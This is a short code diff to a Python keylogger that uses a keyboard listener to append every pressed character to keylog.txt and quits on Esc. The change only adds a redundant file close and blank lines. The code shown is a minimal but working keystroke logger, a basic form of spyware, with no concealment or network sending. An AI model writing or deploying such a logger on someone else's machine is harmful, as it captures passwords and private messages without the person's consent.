@@ -7,6 +7,7 @@ def keyinput(key):
         with open("keylog.txt",'a') as logkey:
             char=key.char
             logkey.write(char)
+            logkey.close()
     else:
         if key==keyboard.Key.esc:
             sys.exit()        
@@ -18,6 +19,7 @@ if __name__=="__main__":
     listener=keyboard.Listener(on_press=keyinput)
     listener.start()
     input()
+    
     
     
     
